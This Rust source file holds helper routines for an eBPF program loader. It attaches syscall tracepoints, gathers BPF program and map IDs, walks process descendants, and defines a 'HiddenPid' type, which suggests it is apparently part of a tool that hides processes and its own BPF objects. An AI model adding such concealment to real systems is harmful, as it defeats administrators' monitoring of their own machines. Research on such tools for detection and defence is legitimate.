use std::{collections::HashSet, fs::OpenOptions, io::Write, path::Path};

use anyhow::{anyhow, Error};
use aya::{
    maps::loaded_maps,
    programs::{loaded_programs, ProgramInfo, TracePoint},
    Ebpf, Pod,
};
use caracal_common::MAX_PID_LENGTH;
use log::debug;
use sysinfo::{Pid, Process, System};
#[inline]
pub fn list_active_programs() -> Vec<u32> {
    let mut active_programs = Vec::<u32>::new();
    for prog in loaded_programs().filter_map(Result::ok) {
        active_programs.push(prog.id());
    }
    active_programs
}
#[inline]
pub fn list_active_maps() -> Vec<u32> {
    let mut active_maps = Vec::<u32>::new();
    for map in loaded_maps().filter_map(Result::ok) {
        active_maps.push(map.id());
    }
    active_maps
}

pub fn write_to_tracefs(message: &str, path: &str) -> std::io::Result<()> {
    let tracefs_path = Path::new(path);
    let mut file = OpenOptions::new().write(true).open(tracefs_path)?;
    write!(file, "{}", message)?;
    Ok(())
}

pub struct Builder<'a> {
    pub ebpf: &'a mut Ebpf,
    pub tracepoints: Vec<SyscallTracepoint>,
}
pub struct SyscallTracepoint {
    pub func_name: String,
    pub syscall_name: String,
}

impl From<(&str, &str)> for SyscallTracepoint {
    fn from(v: (&str, &str)) -> Self {
        Self {
            func_name: v.0.into(),
            syscall_name: v.1.into(),
        }
    }
}

impl Builder<'_> {
    pub fn build(&mut self) -> Result<Vec<ProgramInfo>, Error> {
        let mut programs_info = vec![];
        for tp in &self.tracepoints {
            let fname = &tp.func_name;
            let program: &mut TracePoint = self
                .ebpf
                .program_mut(fname)
                .ok_or_else(|| anyhow!("program '{fname}' not found"))?
                .try_into()?;

            program.load()?;
            program.attach("syscalls", &tp.syscall_name)?;
            programs_info.push(program.info()?)
        }
        Ok(programs_info)
    }
}

#[derive(Clone)]
pub struct BpfProgInfos {
    pub prog_ids: Vec<u32>,
    pub map_ids: Vec<u32>,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct HiddenPid {
    bytes: [u8; MAX_PID_LENGTH as usize],
    len: usize,
}
impl HiddenPid {
    pub fn new(str_repr: &str) -> Self {
        let mut bytes = [0u8; MAX_PID_LENGTH as usize];
        let len = str_repr.len().min(MAX_PID_LENGTH as usize);
        bytes[..len].copy_from_slice(str_repr.as_bytes());
        debug!("{}", unsafe { std::str::from_utf8_unchecked(&bytes) });
        Self { bytes, len }
    }
}
unsafe impl Pod for HiddenPid {}

pub fn fetch_progs_ids_map_ids(progs_info: Vec<ProgramInfo>) -> Result<BpfProgInfos, Error> {
    let mut prog_ids = vec![];
    let mut map_ids = vec![];
    for pinfo in progs_info {
        prog_ids.push(pinfo.id());
        if let Some(maps) = pinfo.map_ids().unwrap() {
            for mapid in maps {
                map_ids.push(mapid);
            }
        }
    }
    prog_ids.sort();
    let mut map_ids = map_ids
        .into_iter()
        .collect::<HashSet<u32>>()
        .into_iter()
        .collect::<Vec<u32>>();
    map_ids.sort();
    Ok(BpfProgInfos { prog_ids, map_ids })
}

pub fn get_progs_info_from_progs_ids(prog_ids: Vec<u32>) -> Vec<ProgramInfo> {
    let mut prog_info: Vec<ProgramInfo> = vec![];
    for p in loaded_programs().filter_map(Result::ok) {
        if prog_ids.contains(&p.id()) {
            prog_info.push(p)
        }
    }
    prog_info
}

pub fn list_threads(proc: &Process) -> Vec<Pid> {
    let mut threads: Vec<Pid> = vec![];
    if let Some(tasks) = proc.tasks() {
        for pid in tasks {
            threads.push(*pid)
        }
    }
    threads
}
pub fn get_descendants(sys: &System, pid: Pid) -> Vec<Pid> {
    let mut descendants = Vec::new();
    let mut queue: Vec<Pid> = vec![pid];

    let mut threads: Vec<Pid> = vec![];
    while let Some(current) = queue.pop() {
        if let Some(proc) = sys.process(current) {
            threads.extend(list_threads(proc))
        };

        for (child_pid, proc) in sys.processes() {
            if proc.parent() == Some(current) && !threads.contains(&proc.pid()) {
                descendants.push(*child_pid);
                queue.push(*child_pid);
            }
        }
    }

    descendants
}
